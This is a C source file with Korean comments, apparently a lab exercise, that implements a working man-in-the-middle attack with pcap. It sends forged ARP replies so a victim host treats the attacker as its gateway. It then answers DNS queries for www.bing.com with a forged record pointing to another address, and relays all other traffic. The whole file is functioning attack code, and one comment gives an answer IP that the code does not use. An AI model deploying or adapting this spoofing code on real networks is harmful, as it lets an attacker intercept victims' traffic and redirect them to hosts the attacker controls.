#include "header.h"

// ARP 스푸핑 패킷 생성 함수
void ARP_spooping(u_char* arpdata)
{
	Frame* pEther = (Frame*)arpdata;

	// 1. 이더넷 헤더 설정
	// Source MAC: 공격자(나)의 MAC
	pEther->srcMac[0] = 0x6c; pEther->srcMac[1] = 0x05; pEther->srcMac[2] = 0xd3;
	pEther->srcMac[3] = 0x37; pEther->srcMac[4] = 0xb6; pEther->srcMac[5] = 0x42;

	// Destination MAC: 피해자(Victim)의 MAC (여기는 VMware MAC 범위로 보임)
	pEther->dstMac[0] = 0x00; pEther->dstMac[1] = 0x50; pEther->dstMac[2] = 0x56;
	pEther->dstMac[3] = 0xf2; pEther->dstMac[4] = 0x78; pEther->dstMac[5] = 0x0e;

	pEther->type = htons(0x0806); // ARP 프로토콜

	// 2. ARP 메시지 설정
	arpheader* pArp = (arpheader*)(arpdata + sizeof(Frame));

	// Sender MAC: 공격자(나)의 MAC (수정 될 수도 있으므로 확인 해 보아야함.)
	pArp->srcMac[0] = 0x6c; pArp->srcMac[1] = 0x05; pArp->srcMac[2] = 0xd3;
	pArp->srcMac[3] = 0x37; pArp->srcMac[4] = 0xb6; pArp->srcMac[5] = 0x42;

	// Target MAC: 피해자의 MAC (수정 될 수 있으므로 확인 해 보아야함 [vmware 환경])
	pArp->dstMac[0] = 0x00; pArp->dstMac[1] = 0x0c; pArp->dstMac[2] = 0x29;
	pArp->dstMac[3] = 0xbb; pArp->dstMac[4] = 0x21; pArp->dstMac[5] = 0x47;

	pArp->MacLen = 6;
	pArp->MacType = htons(0x01); // 이더넷

	// [중요] Sender IP: 게이트웨이 IP (192.168.216.2)
	// 피해자에게 "내가 게이트웨이다"라고 거짓말을 함
	pArp->srcIp[0] = 192; pArp->srcIp[1] = 168; pArp->srcIp[2] = 216; pArp->srcIp[3] = 2;

	// Target IP: 피해자 IP (192.168.216.128)
	pArp->dstIp[0] = 192; pArp->dstIp[1] = 168; pArp->dstIp[2] = 216; pArp->dstIp[3] = 128;

	pArp->IpLen = 4;

	pArp->protocol = htons(0x0800); // IPv4
	pArp->request = htons(0x0002);  // ARP Reply (응답)

	return;
}

// DNS 쿼리(URL) 길이 계산 함수
void URL_checking(const u_char* url, unsigned short* url_length)
{
	int i = 0;
	// NULL 문자가 나올 때까지 카운트
	while (url[i] != 0x00)
	{
		i++;
	}
	*url_length = i + 1; // NULL 포함 길이 반환
	return;
}

// DNS 스푸핑 핵심 로직
// 패킷을 분석하고, 타겟 URL이면 조작된 응답을 버퍼에 작성함
int DNS_spooping(const u_char* pkt_data, u_char* szbuffer, unsigned char* dstMac_buff, unsigned char* srcMac_buff)
{
	// 각 헤더 포인터 매핑
	Frame* pEther = (Frame*)(pkt_data);
	Packet* pIp = (Packet*)(pkt_data + sizeof(Frame));
	int ipLen = (pIp->verihl & 0x0F) * 4; // IP 헤더 길이 계산
	Segment* pUdp = (Segment*)(pkt_data + sizeof(Frame) + ipLen);
	Dnsheader* pdns = (Dnsheader*)(pkt_data + sizeof(Frame) + ipLen + sizeof(Segment));

	// DNS 쿼리 시작 위치 (DNS 헤더 12바이트 뒤)
	unsigned char* purl = (u_char*)(pkt_data + sizeof(Frame) + ipLen + sizeof(Segment) + 12);

	unsigned short queries = 0;
	unsigned int total_length = 0;

	// 필터링: IPv4(0x0800) && UDP(17) && 목적지 포트 53(DNS)
	if (ntohs(pEther->type) == 0x0800 && pIp->protocol == 17 && pUdp->dstPort == 53)
	{
		URL_checking(purl, &queries); // URL 길이 계산

		// 타겟 URL: www.bing.com (DNS 포맷: 3www4bing3com0)
		unsigned char cmp_url[] = { 0x03, 0x77 ,0x77 ,0x77 ,0x04 ,0x62 , 0x69 , 0x6E, 0x67 ,0x03, 0x63, 0x6F, 0x6D, 0x00 };

		// 조작된 패킷을 만들 버퍼의 헤더 포인터들
		Frame* pwEther = (Frame*)szbuffer;
		Packet* pwIp = (Packet*)(szbuffer + sizeof(Frame));
		Segment* pwudp = (Segment*)(szbuffer + sizeof(Frame) + 20); // IP헤더 20바이트 가정
		Dnsheader* pwdns = (Dnsheader*)(szbuffer + sizeof(Frame) + 20 + 8);

		// URL 매칭 성공 시 공격 수행
		if (memcmp(cmp_url, purl, sizeof(cmp_url)) == 0)
		{
			// [이더넷 헤더 스왑]
			// 목적지: 원래 패킷의 출발지 (피해자에게 되돌려줌)
			memcpy(pwEther->dstMac, pEther->srcMac, 6);

			// 출발지: 공격자(나)의 MAC (내가 게이트 웨이라고 ARP 스푸핑을 하였기에 해당 물리 주소 작성)
			pwEther->srcMac[0] = 0x6c; pwEther->srcMac[1] = 0x05; pwEther->srcMac[2] = 0xd3;
			pwEther->srcMac[3] = 0x37; pwEther->srcMac[4] = 0xb6; pwEther->srcMac[5] = 0x42;

			pwEther->type = htons(0x0800);

			// [IP 헤더 설정]
			pwIp->verihl = 0x45; // v4, 5 words
			pwIp->tos = 0;
			pwIp->length = 0; // 나중에 계산
			pwIp->id = 0x3412;
			pwIp->flags = htons(0x4000); // Don't Fragment
			pwIp->protocol = 17; // UDP
			pwIp->ttl = 0xFF;
			pwIp->checksum = 0x0000;

			// IP 주소 스왑 (목적지 <-> 출발지)
			memcpy(pwIp->srcIp, pIp->dstIp, 4);
			memcpy(pwIp->dstIp, pIp->srcIp, 4);

			// [UDP 헤더 설정]
			pwudp->srcPort = pUdp->dstPort; // 53
			pwudp->dstPort = pUdp->srcPort; // 피해자 포트
			pwudp->length = 0; // 나중에 계산
			pwudp->checksum = 0x0000;

			// [DNS 헤더 설정]
			pwdns->trans_id = pdns->trans_id; // ID 유지
			pwdns->flags = htons(0x8180);     // 응답 플래그 (Standard response, No error)
			pwdns->Questions = htons(pdns->Questions);
			pwdns->Answer_rrs = htons(1);     // 정답 1개 추가
			pwdns->Authority_rrs = 0;
			pwdns->Additional_rrs = 0;

			// 질문(Queries) 섹션 복사
			memcpy((unsigned char*)pwdns + 12, (unsigned char*)pdns + 12, queries + 4);

			// 정답(Answers) 섹션 생성
			// 0xc00c: 이름 압축 포인터, Type A, Class IN, TTL, Data Len 4, IP: 10.168.73.4
			unsigned char answer[] = { 0xc0, 0x0c, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x3c, 0x00, 0x04, 192, 168, 45, 102};

			// 정답 섹션 붙여넣기
			memcpy((unsigned char*)pwdns + 12 + queries + 4, answer, 16);

			// 전체 길이 계산 및 설정 (htons 적용)
			pwIp->length = htons(20 + 8 + 12 + queries + 4 + sizeof(answer));
			pwudp->length = htons(8 + 12 + queries + 4 + sizeof(answer));

			// 체크섬 계산
			pwIp->checksum = CalchecksumIp(pwIp);
			pwudp->checksum = CalchecksumUdp(pwIp, pwudp);

			// 전송할 총 패킷 길이 반환
			total_length = ntohs(pwIp->length) + sizeof(Frame);
		}
	}
	return total_length;
}

// 패킷 캡처 시 호출되는 콜백 함수
void packet_dispatcher(u_char* temp1, const struct pcap_pkthdr* header, const u_char* pkt_data)
{
	unsigned char arpdata[42] = { 0 };
	unsigned char szbuffer[1514] = { 0 };

	Frame* rEther = (Frame*)pkt_data;

	// 진짜 게이트웨이 MAC 주소
	unsigned char dstMac_buff[6] = { 0x00, 0x50, 0x56, 0xf2, 0x78, 0x0e };
	unsigned char srcMac_buff[6] = { 0 };
	int total = 0;

	// 패킷의 출발지 MAC 저장
	memcpy(srcMac_buff, rEther->srcMac, 6);

	// 1. ARP 스푸핑 패킷 생성 및 전송 (지속적으로 감염시킴)
	ARP_spooping(arpdata);
	printf("success ARP_spooing\n");

	if (pcap_sendpacket(temp1, arpdata, sizeof(Frame) + sizeof(arpheader)) != 0)
		printf("fail to send ARP_packet : %s\n", pcap_geterr(temp1));

	// 2. DNS 스푸핑 시도
	total = DNS_spooping(pkt_data, szbuffer, dstMac_buff, srcMac_buff);

	if (total > 0)
		// 스푸핑 성공 시 조작된 패킷 전송
		pcap_sendpacket(temp1, szbuffer, total);
	else
	{
		// 스푸핑 대상이 아니면 정상적으로 릴레이 (Packet Relay)
		printf("fail to send DNS_Answer\n");

		int len = header->caplen;

		// 원본 패킷 복사
		memcpy(szbuffer, pkt_data, len);

		Frame* temp = (Frame*)szbuffer;
		// 목적지를 진짜 게이트웨이로 변경
		memcpy(temp->dstMac, dstMac_buff, 6);
		// 출발지를 나(공격자)로 변경 (양방향 통신 유지 위해)
		memcpy(temp->srcMac, srcMac_buff, 6);

		// 릴레이 패킷 전송
		pcap_sendpacket(temp1, szbuffer, len);
	}

	return;
}

int main(int argc, _TCHAR* argv[])
{
	pcap_if_t* alldevs;
	pcap_if_t* d;

	char errbuf[PCAP_ERRBUF_SIZE];
	int i = 0, inum;

	pcap_t* adhandle;

	// 1. 네트워크 디바이스 목록 찾기
	if (pcap_findalldevs(&alldevs, errbuf) == -1)
	{
		fprintf(stderr, "Error findalldevs");
		return -1;
	}

	// 디바이스 목록 출력
	for (d = alldevs; d; d = d->next)
	{
		printf("%d.%s", ++i, d->name);
		if (d->description)
			printf(" (%s)\n", d->description);
		else
			printf("(No description available)\n");
	}

	if (i <= 0)
	{
		printf("\nNo interfaces found! Make sure Npcap is installed.\n");
		pcap_freealldevs(alldevs);
	}

	// 2. 사용자로부터 인터페이스 선택받기
	printf("Enter the interface number (1-%d):", i);
	scanf_s("%d", &inum);

	if (inum < 1 || inum > i)
	{
		printf("out of range\n");
		pcap_freealldevs(alldevs);
		return -1;
	}

	// 선택한 인터페이스 포인터로 이동
	for (d = alldevs, i = 0; i < inum - 1; d = d->next, i++);

	// 3. 선택한 어댑터 열기 (Promiscuous Mode)
	if ((adhandle = pcap_open_live(d->name, 65536, 1, 1000, errbuf)) == NULL)
	{
		fprintf(stderr, "\nUnable to open the adapter. %s is not supported by Npcap\n", d->name);
		pcap_freealldevs(alldevs);
		return -1;
	}

	printf("\nlistening on %s...\n", d->description);
	pcap_freealldevs(alldevs);

	// 4. 패킷 캡처 루프 시작 (콜백 함수: packet_dispatcher)
	pcap_loop(adhandle, 0, packet_dispatcher, adhandle);

	pcap_close(adhandle);

	return 0;
}